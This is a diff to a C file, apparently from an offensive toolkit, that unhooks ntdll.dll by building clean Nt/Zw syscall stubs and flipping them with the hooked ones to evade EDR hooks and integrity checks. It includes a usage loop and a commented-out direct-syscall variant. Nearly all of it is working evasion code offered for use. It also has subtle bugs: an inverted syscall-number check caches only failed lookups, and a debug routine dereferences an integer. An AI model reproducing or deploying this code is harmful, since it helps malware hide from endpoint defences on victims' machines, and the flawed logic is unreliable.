@@ -3,10 +3,64 @@
 ** Created on: Thu 24 Sep 2026 01:53:35 PM CEST
 ** ntdll_reconstruction.c
 ** File description:
-** <..>
+**  Read NTDLL.dll find hooked Nt/Zw functions create a clean stub, flip back
+**  and fourth from clean/hooked syscall stubs to avoid EDR ntdll.dll hashes checks
+**  and bypass userland hooks. More info on this technique here: https://leosmith.wtf/blog/ntdll_reconstruction.html
+** Usage:
+**  struct hook_cache	*cache = 0;
+**
+**  cache = ntdll_reconstruction_init();
+**  if (cache == 0)
+**    // Throw Error!
+**  while (1) {
+**    // Do whatever
+**    cache = ntdll_reconstruction_flip(cache); // Back to hooked stub
+**    if (cache == 0)
+**      // Throw Error!
+**    Sleep(1234);
+**    cache = ntdll_reconstruction_flip(cache); // Back to clean stub
+**    if (cache == 0)
+**      // Throw Error!
+**  }
 */
 
 #include "ntdll_reconstruction.h"
+
+static int					switch_memory_protection(void *memory, unsigned long long size, unsigned long long perm, DWORD *old)
+{
+	/*
+	** This is the funciton you should edit with the technique you wan't to use for this example
+	** I am using kernel32.dll but this is dumb for obvious reasons....
+	**/
+	if (!VirtualProtect(memory, size, perm, old))
+		return				(0);
+	return					(1);
+
+/*	struct sk4r4b_syscall	*ssn_NtProtectVirtualMemory = 0;
+	NTSTATUS				status = 0;
+
+	ssn_NtProtectVirtualMemory = (struct sk4r4b_syscall *)sk4r4b_resolve(HASH_ntdll_dll, HASH_NtProtectVirtualMemory);
+	if (ssn_NtProtectVirtualMemory == 0)
+		return				(0);
+	status = (NTSTATUS)sk4r4b_direct_syscall(ssn_NtProtectVirtualMemory->ssn, ull(5), ull(NtCurrentProcess()), &memory, &size, perm, old);
+	if (status != 0)
+		return				(0);
+	return					(1);*/
+}
+
+/*static void				display_cache(struct hook_cache *cache)
+{
+	// A good to have debug printf function!
+	struct hook_cache	*tmp = cache;
+	int					level = 0;
+
+	while (tmp) {
+		printf("hook_cache: Level(%d) [ node: %p ] [ mem: %p ] [ ntdll_pos: %p ] [ next: %p ]\n", level, tmp, tmp->mem, tmp->ntdll_pos, tmp->next);
+		printf("Content: %*S\n", level->mem, REPLACE_SIZE);
+		tmp = tmp->next;
+		level++;
+	}
+}*/
 
 static void					*get_local_ntdll(void)
 {
@@ -58,23 +112,16 @@ static int				find_ssn(unsigned char *memory, unsigned int depth)
 	return				(-1);
 }
 
-static void					inplace_inject_stub(unsigned char *memory, int ssn)
+struct hook_cache		*append_cache(struct hook_cache *cache, unsigned char *memory, int ssn)
 {
-	unsigned char			stub[] = {
+	struct hook_cache	*self = ntdll_reconstruction_malloc(sizeof(struct hook_cache));
+	struct hook_cache	*tmp = cache;
+	unsigned char			stub[REPLACE_SIZE] = {
 		0x4c, 0x8b, 0xd1,								// mov r10, rcx
 		0xb8, (ssn & 0xFF), ((ssn >> 8) & 0xFF), 0x00, 0x00, // mov eax, ssn
 		0x0f, 0x05,										/* syscall */
 		0xc3											/* ret */
 	};
-
-	for (unsigned int i = 0; i < REPLACE_SIZE; i++)
-		memory[i] = stub[i];
-}
-
-struct hook_cache		*append_cache(struct hook_cache *cache, unsigned char *memory)
-{
-	struct hook_cache	*self = ntdll_reconstruction_malloc(sizeof(struct hook_cache));
-	struct hook_cache	*tmp = cache;
 
 	if (self == 0) {
 		ntdll_reconstruction_clear_cache(cache);
@@ -89,7 +136,7 @@ struct hook_cache		*append_cache(struct hook_cache *cache, unsigned char *memory
 	}
 	self->next = 0;
 	for (unsigned int i = 0; i < REPLACE_SIZE; i++)
-		self->mem[i] = memory[i];
+		self->mem[i] = stub[i];
 	if (cache == 0)
 		return			(self);
 	while (tmp->next != 0)
@@ -101,6 +148,7 @@ struct hook_cache		*append_cache(struct hook_cache *cache, unsigned char *memory
 struct hook_cache		*ntdll_reconstruction_init(void)
 {
 	void					*ntdll_ptr = 0;
+	struct hook_cache		*flipped = 0;
 	struct hook_cache		*cache = 0;
 	IMAGE_DOS_HEADER		*dos = 0;
 	IMAGE_NT_HEADERS		*nt = 0;
@@ -113,8 +161,6 @@ struct hook_cache		*ntdll_reconstruction_init(void)
 	unsigned long			fn_rva = 0;
 	unsigned short			ordinal = 0;
 	char					*func_name = 0;
-	char					white_list[2] = { 'N', 't' };
-	char					white_list2[2] = { 'Z', 'w' };
 	void					*code_base = 0;
 	unsigned long long		code_size = 0;
 	DWORD					old_protection = 0;
@@ -131,8 +177,6 @@ struct hook_cache		*ntdll_reconstruction_init(void)
 		return				(0);
 	code_base = (void *)((unsigned char *)ntdll_ptr + nt->OptionalHeader.BaseOfCode);
 	code_size = (unsigned long long)(nt->OptionalHeader.SizeOfCode);
-	if (!VirtualProtect(code_base, code_size, PAGE_READWRITE, &old_protection))
-		return				(0);
 	export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
 	export_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
 	if (export_rva == 0)
@@ -143,23 +187,23 @@ struct hook_cache		*ntdll_reconstruction_init(void)
 	addr_of_name_ordinals = (unsigned short *)((unsigned char *)ntdll_ptr + exports->AddressOfNameOrdinals);
 	for (unsigned int i = 0; i < exports->NumberOfNames; i++) {
 		func_name = (unsigned char *)ntdll_ptr + addr_of_names[i];
-		if (ntdll_reconstruction_strncmp(func_name, white_list, 2) == 0 || ntdll_reconstruction_strncmp(func_name, white_list2, 2) == 0) {
+		if ((func_name[0] == 'N' && func_name[1] == 't' && func_name[2] >= 'A' && func_name[2] <= 'Z') || (func_name[0] == 'Z' && func_name[1] == 'w' && func_name[2] >= 'A' && func_name[2] <= 'Z')) {
 			ordinal = addr_of_name_ordinals[i];
 			fn_rva  = addr_of_functions[ordinal];
 			if ((fn_rva < export_rva || fn_rva >= export_rva + export_size) && is_hooked((unsigned char *)ntdll_ptr + fn_rva)) {
 				ssn = find_ssn((unsigned char *)ntdll_ptr + fn_rva, 0);
-				if (ssn == -1)
-					break; // There was an error...
-				cache = append_cache(cache, ntdll_ptr + fn_rva);
-				inplace_inject_stub((unsigned char *)ntdll_ptr + fn_rva, ssn);
+				if (ssn > -1)
+					continue;
+				cache = append_cache(cache, (void *)((unsigned char *)ntdll_ptr + fn_rva), ssn);
 			}
 		}
 	}
-	if (!VirtualProtect(code_base, code_size, old_protection, &old_protection)) {
+	flipped = ntdll_reconstruction_flip(cache);
+	if (flipped == 0) {
 		ntdll_reconstruction_clear_cache(cache);
 		return				(0);
 	}
-	return					(cache);
+	return					(flipped);
 }
 
 struct hook_cache			*ntdll_reconstruction_flip(struct hook_cache *cache)
@@ -193,7 +237,7 @@ struct hook_cache			*ntdll_reconstruction_flip(struct hook_cache *cache)
 	}
 	code_base = (void *)((unsigned char *)ntdll_ptr + nt->OptionalHeader.BaseOfCode);
 	code_size = (unsigned long long)(nt->OptionalHeader.SizeOfCode);
-	if (!VirtualProtect(code_base, code_size, PAGE_READWRITE, &old_protection)) {
+	if (!switch_memory_protection(code_base, code_size, PAGE_READWRITE, &old_protection)) {
 		ntdll_reconstruction_clear_cache(cache);
 		return				(0);
 	}
@@ -210,7 +254,7 @@ struct hook_cache			*ntdll_reconstruction_flip(struct hook_cache *cache)
 		}
 		tmp = tmp->next;
 	}
-	if (!VirtualProtect(code_base, code_size, old_protection, &old_protection)) {
+	if (!switch_memory_protection(code_base, code_size, old_protection, &old_protection)) {
 		ntdll_reconstruction_clear_cache(cache);
 		return				(0);
 	}
